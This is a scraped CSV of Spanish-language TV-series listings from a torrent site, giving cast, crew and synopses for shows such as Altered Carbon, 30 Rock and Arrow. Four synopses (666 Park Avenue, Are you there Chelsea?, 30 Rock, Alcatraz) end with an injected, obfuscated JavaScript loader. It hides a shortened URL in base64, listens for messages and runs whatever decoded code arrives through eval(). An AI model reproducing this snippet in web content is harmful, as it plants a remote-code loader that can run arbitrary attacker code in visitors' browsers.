Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/american-gothic/,American Gothic,"
                       Título original: American Gothic
Año: 2016
País: Estados Unidos
Director: Matt Shakman
Guión: Corinne Brinkerhoff
Productora: Amblin Television / Full Fathom Five
Género: Drama, Suspense

Capítulos: 13


Reparto:

Juliet Rylance ... Alison Hawthorne-Price
Antony Starr ... Garrett Hawthorne
Justin Chatwin ... Cam Hawthorne
Megan Ketch ... Tessa Hawthorne Ross
Elliot Knight ... Brady Ross
Stephanie Leonidas ... Sophie Hawthorne
Gabriel Bateman ... Jack Hawthorne
Virginia Madsen ... Madeline Hawthorne						","
Descripcion
Este drama original se centra en una prominente familia de Boston que intenta redefinirse a sí misma tras el escalofriante descubrimiento que vincula al recientemente fallecido patriarca de la familia con una cadena de asesinatos que abarcan décadas, en medio de un ambiente marcado por la sospecha de que uno de ellos pudo haber sido su cómplice.
Creada por Corinne Brinkerhoff y James Frey para CBS, la primera temporada contará con 13 episodios. El piloto de este drama está dirigido por Matt Shakman (conocido por sus trabajos como director en las series Fargo, Mad Men y The Good Wife.

"
https://www.subtorrents1.com/series/ad-vitam/,Ad Vitam,"
                       Titulo Original: Ad Vitam 
Titulo Español: Ad Vitam 
Año: 2019 
Genero: Drama, Ciencia Ficcion 
Promedio De Duracion: 52 Minutos 
Pais: Francia
Clasificacion: Mayores de 12 Años 						","
Descripcion
Ad Vitam es un thriller de ciencia ficción francés ambientado en un futuro distópico en el que las personas pueden vivir eternamente, Lo protagonizan Darius, un policía de 120 años y Christa, una investigadora de 24. Su intrigante aventura comienza cuando investigan un suicidio de siete adolescentes que les lleva por un mundo de alternativas, conspiraciones y decisiones de vida o muerte.
"
https://www.subtorrents1.com/series/100-code/,100 Code,"

Título original
    The Hundred Code (TV Series)aka 
Año
    2015
País
    Suecia Suecia
Director
    Jonathan Sjöberg, Robert Moresco, Lisa James-Larsson, Andreas Öhman 
Guion
    Amanda Moresco, P.J. Hennigan, Robert Moresco, Allan Steele, Bill Tangradi, Michael Yebba
Música
    Adam Nordén
Fotografía
    Ulf Brantas
Reparto
    Michael Nyqvist, Dominic Monaghan, Felice Jankell, Charlotta Jonsson, Kristoffer Berglund, Peter Eggers, Danilo Bejarano, Jenny Hutton, Hedda Stiernstedt, Roisin Murphy, Johanna Hedberg, Christian Svensson, Sara Zommorodi, Jason Furlani 
Productora
    Coproducción Suecia-Alemania; Fabrik Entertainment / Red Arrow International / Sky / SBS Discovery
Género
    Serie de TV. Thriller | Crimen 						","
Descripcion
Tommy Conley (Dominic Monaghan), un detective de Nueva York, es enviado a Suecia para observar y asesorar a la policía local en la investigación. Se une el sueco Mikael Eklund (Michael Nyqvist), un veterano de homicidios que trabaja de acuerdo con las reglas. Extremadamente nacionalista, Mikael no acoge con satisfacción la presencia de Conley, se encarga de criticar la cultura americana cada vez que puede. Aunque los dos no se soportan, ellos necesitan encontrar una manera de trabajar juntos.
"
https://www.subtorrents1.com/series/911/,911,"

Título original
    9-1-1 (TV Series)
Año
    2018
País
    Estados Unidos
Dirección
    Ryan Murphy (Creator), Brad Falchuk (Creator)
Reparto
    Angela Bassett, Peter Krause, Kenneth Choi, Connie Britton, Aisha Hinds, Rockmond Dunbar, Oliver Stark
Productora
    20th Century Fox Television / Ryan Murphy Television / Brad Falchuk Teley-Vision
Género
    Serie de TV. Drama | Basado en hechos reales 						","
Descripcion
9-1-1 es un drama basado en hechos reales que explora la ajetreada profesión y vida del personal que opera detrás de la línea de emergencia 911. A través de ella, policías, paramédicos y bomberos reciben llamadas de urgencias diarias por las que rápidamente deben acudir y poner en riesgo su vida para salvar la de otros.
"
https://www.subtorrents1.com/series/altered-carbon/,Altered Carbon,"
                       Título original
    Altered Carbon (TV Series) 
Año
    2018
Duración
    60 min.
País
    Estados Unidos
Dirección
    Laeta Kalogridis (Creator), Miguel Sapochnik 
Guion
    Laeta Kalogridis, David H. Goodman (Novela: Richard Morgan)
Música
    Martin Ahlgren, Neville Kidd
Reparto
    Joel Kinnaman, Renee Goldsberry, James Purefoy, Katie Stuart, Martha Higareda, Dichen Lachman, Chris Conner, Leonardo Nam, Ato Essandoh, Nicole Anthony, Marlene Forte, Trieu Tran, Lisa Chandler 
Productora
    Skydance Television / Mythology Entertainment / Netflix
Género
    Serie de TV. Ciencia ficción. Thriller | Cyberpunk. Crimen 						","
Descripcion
Altered Carbon se desarrolla en medio del siglo XXV, una época en la que las personas ya no mueren, técnicamente, sino que sus mentes y consciencias son transferidas de un cuerpo a otro… Adaptación de la novela de Richard K. Morgan que se centra en la historia de Takeshi Kovacs, un detective que se ve envuelto en una enorme conspiración, 500 años en el futuro, en medio de un mundo cyberpunk.
"
https://www.subtorrents1.com/series/8-tage/,8 TAGE,"
                       Título original
8 Tage
Año
2019
Duración
88 min.
País
Alemania Alemania
Dirección
Rafael Parente (Creator),  Peter Kocyla (Creator),  Michael Krummenacher, Stefan Ruzowitzky
Guion
Peter Kocyla, Rafael Parente, Benjamin Seiler
Música
David Reichelt
Fotografía
Benedict Neuenfels, Jakob Wiessner
Reparto
Christiane Paul,  Mark Waschke,  Lena Klenke,  Fabian Hinrichs,  Nora Waldstätten
Productora
NEUESUPER. Distribuida por Sky
Género
Serie de TV. Drama | Miniserie de TV						","
Descripcion
Ocho días restantes. Un meteorito de 60 kilómetros de ancho está en curso de colisión con la Tierra. La zona de colisión está justo en el centro de Europa. Tasa estimada de supervivencia: cero. Los Estados Unidos intentan sacar al meteorito del curso con armas nucleares, pero fracasan. Toda Europa está huyendo. No es la espectacular versión de Hollywood, sino la historia esencial de una familia real que hace todo lo posible para sobrevivir cuando el mundo se sale de control.
"
https://www.subtorrents1.com/series/awkward/,Awkward,"
                       Título: Original Awkward
Creador: Lauren Iungerich
Producción Ejecutiva: Lauren Iungerich
Estudio: MTV Productions
Género: Comedia
Temporada: 2ª
Episodios: 12
Lugar de rodaje: Los Angeles
Distribución: MTV Networks
Audiencia temp. pasada: 1,53 millones de espectadores
Horario de emisión: Martes 11.00 p.m.

Reparto
Ashley Rickards ... Jenna Hamilton
Beau Mirchoff ... Matty McKibben
Nikki DeLoach ... Lacey Hamilton
Brett Davern ... Jake Rosati
Molly Tarlov ... Sadie Saxton
Jillian Rose ... Reed Tamara
Desi Lydic ... Valerie Marks
Greer Grammer ... Lissa						","
Descripcion
Awkward ofrece una mirada irreverente al conflicto, el caos y la comedia que acompaña a la vida contemporánea de los adolescentes, todo ello visto a través de los ojos de una quinceañera que ha pasado de ser una desplazada social a ""esa chica"" cuando un accidente hace creer a todos que ha intentado suicidarse. Ahora debe lidiar con ese estigma social, mientras trata de sobrevivir a su enamoramiento del chico más popular del colegio, a una rival que trata de aniquilarla socialmente, a una peculiar consejera escolar, a unos padres que no la entienden y a grandes cantidades de drama juvenil.
Durante quince años, Jenna Hamilton (Ashley Rickards, One Tree Hill) ha fantaseado con que todo el mundo la mire cuando pasea por el pasillo del instituto. Ese día ha llegado por fin… pero por desgracia es como resultado de la mayor vergüenza de su vida. Todo comenzó en un campamento de verano, en el que Jenna perdió la virginidad con Matty (Beau Mirchoff, Mujeres desesperadas). Guapo y popular, rompió su corazón cuando después de su relación le dijo que nadie podía saber lo que había pasado. Las malas noticias continuan cuando Jenna recibe una carta anónima en la que tratan de intimidarla y se meten con su falta de popularidad.
"
https://www.subtorrents1.com/series/aqui-en-la-tierra/,Aquí en la Tierra,"
                       Título original
    Aquí en la Tierra (TV Series) 
Año
    2018
Duración
    60 min.
País
    México México
Dirección
    Everardo Gout, Alonso Ruizpalacios, Mariana Chenillo, Gael García Bernal, Adrian Grunberg 
Guion
    Jorge Dorantes, Kyzza Terrazas, Jacques Bonnavent
Fotografía
    Jaime Reynoso
Reparto
    Alfonso Dosal, Tenoch Huerta, Paulina Dávila, Daniel Giménez Cacho, Gael García Bernal, Ariadna Gil, Yoshira Escárrega, Sofía Sisniega, Ezequiel Diaz, Teresa Ruiz, Guillermo Ríos, Francisco Barreiro, Aidan Vallejo, Andrés Almeida, Rodrigo Azuela, Gilberto Barraza, Zure Don Pablo, José Carlos Rodríguez, Ángeles Cruz, Hoze Meléndez, Gerardo Trejoluna, Mayahuel del Monte, José Ángel García, Alejandra Guilmant, Héctor Holten, David Illescas, Daniela Luque, Rodrigo Murray, Pamela Almanza, Everardo Arzate, Baltimore Beltran, Pablo Chemor, María Evoli, San Rat Fer, Leonardo Ortizgris, Solana Azulay, Alejandro Cuétara, Alan Del Castillo, Natasha Dupeyrón, Pedro Hernández, Diego Jáuregui, Claudia Lobo, Oscar Narvaez, Ana Terán, Estefania Villarreal, Dettmar Yañez 
Productora
    La Corriente del Golfo / Fox Networks Group Latin America. Distribuida por Fox Networks Group Latin America
Género
    Serie de TV. Thriller. Drama | Crimen 
","
Descripcion
Gira en torno a los crímenes y secretos de una de las familias más influyentes de México, de cómo un joven humilde salta las barreras sociales para ascender en la escala económica y política, y sobre la concientización de un joven heredero que lucha por aclarar el asesinato de su padre, en un México muy parecido al de hoy, pero lejos de ser el mismo.
"
https://www.subtorrents1.com/series/666-park-avenue/,666 Park Avenue,"
                       Título Original: 666 Park Avenue
Creadora: David Wilcox
Producción Ejecutiva: Alex Graves, David Wilcox, Gina Girolamo, Leslie Morgenstein y Matt Miller
Estudio: Warner Bros. Television
Género: Drama
Temporada: 1ª
Episodios: 13
Fecha de estreno: 30 de septiembre de 2012
Distribución: Warner
Horario de emisión: Domingos 10.00 p.m.

Reparto:
Rachael Taylor ... Jane Van Veen
Dave Annable ... Henry Martin
Terry O'Quinn ... Gavin Doran
Vanessa Williams ... Olivia Doran
Mercedes Masöhn ... Louise Leonard
Robert Buckley ... Brian Leonard
Helena Mattsson ... Alexis Blume
Erik Palladino ... Tony DeMeo
Samantha Logan ... Nona Clark						","
Descripcion
¿Qué estarías dispuesto a hacer para conseguir todo lo que deseas? Estás invitado a entrar en 666 Park Avenue, una de las direcciones más seductoras de la ciudad de Nueva York. Todo el mundo tiene necesidades acuciantes, deseos y ambiciones. Para los residentes de The Drake, uno de los edificios de apartamentos más lujosos del Upper East Side de Manhattan, todo ello está al alcance de sus manos, por un módico precio, gracias a la cortesía del misterioso dueño de inmueble. Sexy, seductor y acogedor, The Drake mantiene un oscuro control sobre sus inquilinos, alimentando sus ambiciones y deseos. Pero cuidado con lo que deseas, porque el precio que tendrán que pagar por ello es… tu alma.
Bienvenido a The Drake, un aparentemente normal edificio de apartamentos, en donde el mal, la obsesión y los sucesos paranormales están incluidos en el alquiler. En él, todo lo que deseas puede ser tuyo, cortesía de su misterioso propietario, Gavin Doran (Terry O'Quinn, Perdidos). Pero todo contrato de este tipo tiene un precio. Y eso es lo que están a punto de averiguar Jane Van Veen (Rachael Taylor, Los ángeles de Charlie) y Henry Martin (Dave Annable, Cinco hermanos), una joven e idealista pareja que acaba de llegar a la glamurosa Nueva York, en donde se les ofrece la oportunidad de ser los administradores del histórico inmueble. Jane es una chica de pueblo con grandes ambiciones, siempre quiso ser arquitecta. Henry, miembro del equipo del alcalde, es sensato, inteligente y tenaz. Ambos se han visto arrastrados por el intoxicante estilo de vida de la élite de la ciudad.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/ackley-bridge/,Ackley Bridge,"
                       Título original
    Ackley Bridge (TV Series) 
Año
    2017
Duración
    60 min.
País
    Reino Unido Reino Unido
Director
    Ayub Khan-Din (Creator), Kevin Erlis (Creator), Malcolm Campbell (Creator), Jon East, Robert Quinn, Penny Woolcock 
Guion
    Malcolm Campbell, Kevin Erlis, Ayub Khan-Din, Anya Reiss, Suhayla El-Bushra, Ishy Din
Música
    Tim Phillips
Fotografía
    Anna Valdez-Hanks, Sergio Delgado
Reparto
    Poppy Lee Friar, Samuel Bottomley, Amy-Leigh Hickman, Sunetra Sarker, Paul Nicholls, Liz White, Fern Deacon, Nazmeen Kauser, Sam Retford, Jo Joyner, Nohail Nazir Mohammed, Maariah Hussain, Lorraine Cheshire, Anneika Rose, Tom Varey, Adil Ray, India Parsan, Zain Khan, Kainatt Butt, Simon Lowe, Abdullah Shahid, Chris Abe, Nathan Green, Sebastian Shaw, Hassan Mahmood, Harry Myers, Arsher Ali 
Productora
    Channel 4
Género
    Serie de TV. Drama | Colegios & Universidad. Enseñanza. Racismo 						","
Descripcion
Serie ambientada en el instituto de la ficticia localidad inglesa de Yorkshire, el Ackley Bridge College. Se trata de un nuevo centro que ha nacido de la fusión de las dos escuelas preexistentes, una de ellas con mayoría de alumnos británicos, y la otra con estudiantes de origen asiático. Dos culturas, cuya convivencia no siempre es plácida, que se verán obligadas a coexistir en armonía en un centro que pondrá a prueba, a pequeña escala, la cohesión social en la Gran Bretaña post-brexit. Obligadas a fusionarse por motivos económicos, lo cierto es que todos comparten aulas, pero no por ello la comunidad está más cohesionada. Los equipos de fútbol del instituto ahora se dividen según el origen de los jugadores, e incluso dos amigas de toda la vida como Missy y Nasreen, se verán ahora a uno y otro lado de una frontera, psicológica, pero muy real. Romper con la segregación sin descuidar la enseñanza será el mayor de los retos de profesores, alumnos y padres.
"
https://www.subtorrents1.com/series/are-you-there-chelsea/,"Are you there, Chelsea?","
                       TÍTULO ORIGINAL: Are you there, Chelsea? 
PAÍS: Estados Unidos
DIRECTOR: Dottie Zicklin (Creator), Julie Ann Larson (Creator), Gail Mancuso
GUIÓN: Dottie Zicklin , Julie Ann Larson, Brian Gallivan, Ed Lee (Libro: Chelsea Handler)
PRODUCTORA: Emitida por la cadena NBC; Bonanza Productions / Borderline Amazing Productions / Good Humor Television / Warner Bros. Television / Werner Entertainment
GÉNERO 	Serie de TV. Comedia | Sitcom

REPARTO: 
Laura Prepon, Jo Koy, Angel Laketa Moore, Lauren Lapkus, Jake McDorman, Mark Povinelli, Ali Wong, Lenny Clarke, Natasha Leggero, Chelsea Handler, Michaela Rose Haas, Estelle Harris

","
Descripcion
Chelsea (Laura Prepon) es una camarera cuyo objetivo en la vida es el de vivir al límite, sin mirar atrás y sin pedir disculpas, arrastrando a sus amigos en su sendero de desfase. La acompañarán Mark (Jo Koy), un camarero encantador que parece ser la pareja ideal para ella y Shoniqa (Angel Laketa Moore) compañera también de Chelsea que busca lo mejor para ella.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/atypical/,Atypical,"
                       Título original
    Atypical (TV Series) 
Año
    2017
Duración
    30 min.
País
    Estados Unidos Estados Unidos
Dirección
    Seth Gordon, Joe Kessler 
Guion
    Ava Tramer, Robia Rashid
Fotografía
    Joe Kessler
Reparto
    Jennifer Jason Leigh, Keir Gilchrist, Brigette Lundy-Paine, Amy Okuda, Michael Rapaport, Graham Rogers, Nik Dodani, Raúl Castillo, Rachel Redleaf, Jenna boyd 
Productora
    Sony Pictures Television
Género
    Serie de TV. Comedia. Drama | Comedia dramática. Autismo 
Sinopsis
    Sam, un chico de 18 años que roza el autismo, emprende un viaje para encontrarse a sí mismo, conocer el amor, la independencia y desafiar a su familia.						","
Descripcion
Sam, un chico de 18 años que roza el autismo, emprende un viaje para encontrarse a sí mismo, conocer el amor, la independencia y desafiar a su familia. Estreno 2ª temporada: 7 septiembre 2018
"
https://www.subtorrents1.com/series/30-rock/,30 Rock,"
                       Título Original: 30 Rock
Creador: Tina Fey
Producción Ejecutiva: Tina Fey, David Miner, Marci Klein, JoAnn Alfano y Lorne Michaels
Estudio: Universal
Género: Comedia
Temporada: 7ª
Episodios: 13
Lugar de rodaje: Nueva York
Sintonía: 30 Rock Theme Song - Jeff Richmond
Distribución: Universal
Audiencia temp. pasada: 4,55 millones de espectadores
Horario de emisión: Jueves 8.00 p.m.
Premios: 14 Emmy's - 6 Globos de Oro

Reparto:
Tina Fay ... Liz Lemon
Tracy Morgan ... Tracy Jordan
Jane Krakowski ... Jenna DeCarlo
Scott Adsit ... Pete Hornberger
Jack McBrayer ... Kenneth
Alec Baldwin ... Jack Donaghy
Judah Friedlander ... Frank
Rachel Dratch ... Varios personajes						","
Descripcion
Bienvenidos al set de rodaje de ""The Girlie Show"", un programa de televisión de variedades en directo, que sirve como escenario para Rockefeller Plaza, una comedia sobre los entresijos en la producción y creación de un espacio de estas características. La serie está narrada a través del personaje de Liz Lemon (Tina Fey, Saturday Night Live), la guionista principal del programa y que frecuentemente suele ser llevada al límite de su razón y paciencia por las dos estrellas del programa, y el exigente director de la cadena.
Liz, que sigue soltera debido a su compromiso con su trabajo, está viviendo el sueño de todo guionista de comedia, ser la principal responsable creativa de un exigente programa en directo en la ciudad de Nueva York. Aunque su vida tendrá un inesperado sobresalto cuando Jack Donaghy (Alec Baldwin, El Aviador) el descarado nuevo ejecutivo de la cadena decide interferir en el programa y ponerlo patas arriba con sus métodos intrusivos. Además, este ejecutivo decide intimidar a Liz para darle más protagonismo a Tracy Jordan (Tracy Morgan, Saturday Night Live), un egocéntrico e imprevisible actor de cine, que acaba de incorporarse al elenco artístico del programa. Ahora Liz deberá controlar y manejar lo incontrolable, para que el programa, y su sueño, pueda salir adelante.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/agent-x/,Agent X,"
                       Título original: Agent X
Año: 2015
País: Estados Unidos
Director: W. Blake Herron (Creator), Peter O'Fallon, Rod Holcomb, Félix Enríquez Alcalá, John Terlesky, Uta Briesewitz
Guión: W. Blake Herron, Mark A. Altman, Steven Kriozere, Jesse Alexander, Anslem Richardson
Fotografía: Edward J. Pei, Joel Ransom
Productora: TNT
Género: Acción, Espionaje

Capítulos: 10


Reparto:

Sharon Stone ... Natalie Maccabee
Jeff Hephner ... John Case
Jamey Sheridan ... FBI Director Stanton
John Shea ... Thomas Eckhart
Mike Colter ... Miles Lathem
Gerald McRaney ... Malcolm Millar						","
Descripcion
Agent X se centra en John Case (Hephner), un agente de alto secreto del que nadie conoce su identidad real – ni siquiera el Presidente – que está entrenado y listo para servir, cuya única misión es el cuidado de la Vicepresidenta, Natalie Maccabee (Stone). La Vicepresidenta es viuda de un ex Senador de los Estados Unidos que tras la muerte de su marido inicia una meteórica carrera política. Maccabee mantiene una buena relación con Malcolm Millar (McRaney), el mayordomo de su mansión y el guardián de muchos de sus secretos. Junto a él y al agente secreto debe realizar una misión confidencial: proteger la Constitución en tiempos de crisis.
"
https://www.subtorrents1.com/series/ash-vs-evil-dead/,Ash vs Evil Dead,"
                       Título original: Ash vs Evil Dead
Año: 2015
País: Estados Unidos
Director: Sam Raimi, Michael Hurst, Rick Jacobson
Guión: Sam Raimi, Tom Spezialy, Ivan Raimi
Música: Joseph LoDuca
Fotografía: John Cavill, Dave Garbett
Productora: Starz
Género: Terror. Suspenso. Aventura.

Capítulos: 10


Reparto:

Bruce Campbell ... Ashley ""Ash"" Williams
Ray Santiago ... Pablo Simon Bolivar
Dana DeLorenzo ... Kelly Maxwell
Jill Marie Jones ... Amanda Fisher
Lucy Lawless ... Ruby Knowby						","
Descripcion
Secuela de la saga de películas ""Posesión infernal"" Evil Dead, dirigida por Sam Raimi y protagonizada por Bruce Campbell. El protagonista de esta serie es Ash (Campbell) quien, en esta ocasión, deberá enfrentarse a una horda de Deadites, unos humanos poseídos por demonios de Kandarian, que pretenden destruir la humanidad. Así, Ash deberá salir de su refugio, donde ha pasado las últimas décadas, y echar mano de su motosierra para hacer frente a sus enemigos.
"
https://www.subtorrents1.com/series/alcatraz/,Alcatraz,"
                       Título Original: Alcatraz
Creador: Elizabeth Sarnoff, Steven Lilien y Bryan Wynbrandt
Producción Ejecutiva: J.J. Abrams, Elizabeth Sarnoff, Steven Lilien y Bryan Wynbrandt
Estudio: Warner Bros. Television
Género: Acción
Temporada: 1ª 
Episodios: 13
Fecha de estreno: 16 de enero de 2012
Lugar de rodaje: Vancouver y San Francisco (California)
Distribución: Warner
Horario de emisión: Lunes 9.00 p.m.

Reparto:
Sarah Jones ... Rebecca Madsen
Jorge Garcia ... Diego Soto
Sam Neill ... Emerson Hauser
Parminder Nagra ... Lucy Banerjee
Santiago Cabrera ... Jimmy Dickens
Jonny Coyne ... Edwin James
Jason Butler Harner ... E.B. Tiller
Robert Forster ... Ray Archer
","
Descripcion
De los productores ejecutivos J.J. Abrams (Fringe) y Elizabeth Sarnoff (Perdidos) llega Alcatraz, una serie de suspense centrada en la más infame prisión de América, que en el pasado, fue el hogar de los asesinos, violadores, secuestradores y ladrones más peligrosos del país. En ella, una detective de San Francisco es asignada a investigar un asesinato y descubre que el principal sospechoso del caso es un antiguo preso de Alcatraz que ha estado muerto desde hace décadas. Y es que poco a poco saldrá a la luz que un grupo de prisioneros y guardias de esta conocida prisión que desaparecieron de forma misteriosa hace treinta años, están empezando a reaparecer en el presente.
Cuando la detective Rebecca Madsen (Sarah Jones, Sons of Anarchy), de la Policía de San Francisco, es asignada a un complicado caso de homicidio, una huella le lleva a un sorprendente sospechoso, un ex-preso de Alcatraz que murió hace décadas. Debido a su historia familiar, su abuelo y su tío, Ray Archer (Robert Forster, Jackie Brown), fueron guardias de esa prisión, Rebecca muestra un gran interés en el caso, y una vez que descubre que el enigmático y silencioso Emerson Hauser (Sam Neill, Los Tudor), un agente del Gobierno, trata de impedir su investigación, su compromiso con el caso se hace incluso mucho más grande. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/11-22-63-miniserie/,11.22.63 (Miniserie),"
                       Título original: 11/22/63
Año: 2016
País: Estados Unidos
Director: Kevin Macdonald, James Strong
Guión: Bridget Carpenter, Brian Nelson, Quinton Peeples (Novela: Stephen King)
Fotografía: Adam Suschitzky, David Katznelson
Productora: Bad Robot / Warner Bros. Television
Género: Intriga. Ciencia ficción. Thriller | Viajes en el tiempo

Capítulos: 8


Reparto:

James Franco ... Jake Epping
Chris Cooper ... Al Templeton
Josh Duhamel ... Frank Dunning
Lucy Fry ... Marina Oswald
Sarah Gadon ... Sadie
Cherry Jones ... Marguerite Oswald
T.R. Knight ... Johnny Clayton
George Mackay ... Bill Turcotte
Daniel Webber ... Oswald
Leon Rippy ... Harry Dunning
Brooklyn Sudano ... Christy						","
Descripcion
11/22/63 es una novela de Stephen King que gira en torno a un profesor de inglés de secundaria llamado Jake Epping. Jake Epping viaja en el tiempo con el objetivo de evitar el asesinato de John F. Kennedy. A lo largo de la historia, además de a Epping, se puede conocer también a Lee Harvey Oswald, el asesino del Presidente, y a su familia, su madre Marguerite y su esposa de origen ruso Marina.
Para poder llevar a cabo su aventura, Jake cuenta con la ayuda de Al Templeton, un hombre rico que facilita su travesía. Además Harry Dunning, el conserje del instituto donde trabaja Jake, marca de manera muy importante al protagonista. En la década de los 60, dos personajes interactúan con el protagonista, Bill Turcotte, un camarero que se asocia con Jake para realizar la misión; y Sadie, una camarera que se enamora de él sin conocer su secreto.
"
https://www.subtorrents1.com/series/anne/,Anne,"
                       Título original: Anne
Año: 2017
País: Canadá
Director: Niki Caro,  David Evans,  Amanda Tapping
Guion: Moira Walley-Beckett (Novela: Lucy Maud Montgomery)
Música: Ari Posner
Fotografía: Bobby Shore
Productora: Netflix / CBC
Género: Drama

Capítulos: 8


Reparto:

Amybeth McNult ... Anne Shirley
Geraldine James ... Marilla Cuthbert
R.H. Thomson ... Matthew Cuthbert
Lucas Jade Zumann ... Gilbert Blythe
Dalila Bela ... Diana Barry
Corinne Koslo ... Rachel Lynde
Aymeric Jett Montaz ... Jerry Baynard						","
Descripcion
Anne Shirley es una niña huérfana que vive en un pequeño pueblo llamado Avonlea que pertenece a la Isla del Príncipe Eduardo, en el año 1890. Después de una infancia difícil, donde fue pasando de orfanato a hogares de acogida, es enviada por error a vivir con una solterona y su hermano. Cuando cumple 13 años, Anne va a conseguir transformar su vida y el pequeño pueblo donde vive gracias a su fuerte personalidad, intelecto e imaginación.
"
https://www.subtorrents1.com/series/al-hayba/,Al Hayba,"
                       Al Hayba impactó de manera positiva en rating en 12 países de Medio Oriente y África del Norte (MENA), donde obtuvo los shares más importantes entre los 50 dramas emitidos durante Ramadan, según cifras de GFK, MMS, y fue la serie más trending en los 30 días.						","
Descripcion
Hadad: 'Tuvo un comportamiento social increíble en las comunidades árabes, pero también en Canadá, por ejemplo. Un verdadero fenómeno que atraviesa fronteras. Una de las razones ha sido la selección del cast/personalidades y la historia que se desarrolla en la villa que lleva el nombre de la serie, localizada entre Siria y Líbano'.
Los televidentes simpatizaron y se enamoraron de la tribu Sheikh El Jabal. 'Es una producción que muestra una mezcla de mafia con momentos de suspenso y un giro inteligente, con romance y códigos de amor',
"
https://www.subtorrents1.com/series/arrow/,Arrow,"
                       Título Original: Arrow
Creador: Greg Berlanti, Marc Guggenheim y Andrew Kreisberg
Producción Ejecutiva: Greg Berlanti, Marc Guggenheim, David Nutter y Andrew Kreisberg
Estudio: Warner Bros. Television
Género: Acción
Temporada: 1ª 
Episodios: 22
Fecha de estreno: 10 de octubre de 2012
Lugar de rodaje: Vancouver
Distribución: Warner
Horario de emisión: Miércoles 8.00 p.m.

Reparto:
Stephen Amell ... Oliver Queen
Colin Donnell ... Tommy Merlyn
Katie Cassidy ... Laurel Lance
David Ramsey ... John Diggle
Willa Holland ... Thea Queen
Jamey Sheridan ... Robert Queen
Susanna Thompson ... Moira Queen
Paul Blackthorne ... Quentin Lance						","
Descripcion
Basada en los personajes que aparecen en los comics y novelas gráficas publicadas por DC Comics, Arrow es una nueva reinterpretación del legendario Flecha Verde, ofreciendo una versión oscura y pseudo-cinematográfica a la historia de Oliver Queen, un playboy billonario. Desaparecido y dado por muerto durante años, el mundo se sorprende cuando Oliver es descubierto vivo en una isla remota. Pero su aislamiento de la sociedad que conocía le ha hecho cambiar su personalidad y sus prioridades. Decidido a ocultar la verdad sobre el hombre en el que se ha convertido, un superhéroe que lucha contra las injusticias, tratará de compensar las acciones que protagonizó cuando tan sólo era un adolescente.
Conoce a Oliver Queen (Stephen Amell, Crónicas vampíricas). Es atractivo, es inteligente y un billonario. Pero su suerte parece cambiar cuando desaparece durante un accidete marítimo. Después de un violento naufragio, Oliver Queen es dado por muerto. Pero durante cinco años ha estado peleando por sobrevivir en una remota isla del Pacífico. Tras descubrir que sigue vivo, y una vez rescatado, regresa a su casa en Starling City, en donde es bien recibido por su devota madre, Moira (Susanna Thompson, Una vez más), su adorable hermana Thea (Willa Holland, O.C.), y su mejor amigo, Tommy (Colin Donell, Pan Am). Pero todos ellos descubrirán que el Oliver al que despidieron es muy diferente al que ha regresado.
"
